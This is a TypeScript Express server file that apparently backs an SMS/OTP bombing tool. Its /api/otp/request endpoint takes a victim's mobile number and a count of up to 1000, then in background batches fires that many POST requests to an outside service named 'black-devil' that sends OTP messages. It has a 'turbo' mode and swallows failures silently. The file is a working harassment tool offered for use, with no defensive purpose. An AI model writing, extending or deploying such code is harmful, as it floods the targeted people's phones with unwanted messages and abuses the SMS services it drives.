import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import crypto from "crypto";
import cors from "cors";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Initialize Express
const app = express();

// Standard CORS setup
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Rate limiting map
const rateLimitMap = new Map<string, number>();

// Health check
app.get("/api/ping", (req, res) => {
  res.json({ 
    status: "ALIVE", 
    timestamp: new Date().toISOString(),
    platform: process.env.VERCEL ? 'vercel' : 'standard'
  });
});

// API Routes
app.post("/api/otp/request", async (req, res) => {
  try {
    const { mobile, custom_sms, count, mode, ...techData } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "unknown";
    
    // Strict Sanitization
    const mobileNum = String(mobile || "").replace(/\D/g, "");
    if (mobileNum.length < 10) {
      return res.status(400).json({ error: "VALIDATION_ERROR", msg: "Invalid 10-digit number." });
    }

    const seed = custom_sms || "AUTO_GEN";
    const seedHash = crypto.createHash('sha256').update(seed + mobile).digest('hex').slice(0, 16);
    const requestCount = Math.min(Math.max(parseInt(count) || 1, 1), 1000); 
    const isTurbo = mode === "turbo";
    
    // Rate limit check
    const now = Date.now();
    const last = rateLimitMap.get(String(ip)) || 0;
    if (now - last < 2000) {
      return res.status(429).json({ error: "FIREWALL_ACTIVE", msg: "Cooldown active. Wait 2s." });
    }
    rateLimitMap.set(String(ip), now);

    console.log(`[V5.6] Handshake: ${seedHash} | Target: ${mobileNum}`);

    // Forwarding parameters
    const params = new URLSearchParams();
    params.append("mobile", mobileNum);
    params.append("custom_sms", custom_sms || "XfsoCeXADQAg");
    Object.entries(techData).forEach(([k, v]) => {
      params.append(k, typeof v === 'object' ? JSON.stringify(v) : String(v));
    });

    const fireRequest = async () => {
      try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 8000);
        await fetch("https://black-devil-2gwh.onrender.com/", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: params.toString(),
          signal: controller.signal
        });
        clearTimeout(timeoutId);
      } catch (e) {
        // Silent failure for worker noise
      }
    };

    // Responsive Batching
    const batchSize = isTurbo ? 15 : 5;
    const delay = isTurbo ? 20 : 500;

    // Execute in background
    (async () => {
      for (let i = 0; i < requestCount; i += batchSize) {
        const p = Array.from({ length: Math.min(batchSize, requestCount - i) }).map(() => fireRequest());
        await Promise.all(p);
        if (i + batchSize < requestCount) await new Promise(r => setTimeout(r, delay));
      }
    })().catch(e => console.error("[WORKER_ERR]", e));

    res.json({
      status: "STABLE",
      metadata: { session_id: seedHash, packets: requestCount, protocol: "V5.6-PRO-SYNC" }
    });
  } catch (err) {
    console.error("[CRITICAL] API Error:", err);
    res.status(500).json({ error: "INTERNAL_GATEWAY_ERROR", msg: "System failure during execution." });
  }
});

// Static Asset and Vite Middlewares
async function init() {
  if (process.env.NODE_ENV !== 'production' && !process.env.VERCEL) {
    // Dynamic import for Vite to avoid production crashes
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa'
    });
    app.use(vite.middlewares);
  } else {
    // Serve static files from 'dist'
    const distPath = path.resolve(__dirname, 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      // Avoid serving index.html for unknown /api requests
      if (req.url.startsWith('/api/')) {
        return res.status(404).json({ error: 'API_NOT_FOUND' });
      }
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  // Only listen in non-serverless environments
  if (!process.env.VERCEL) {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => {
      console.log(`[Shatarudra] Portal open on port ${PORT}`);
    });
  }
}

init();

export default app;
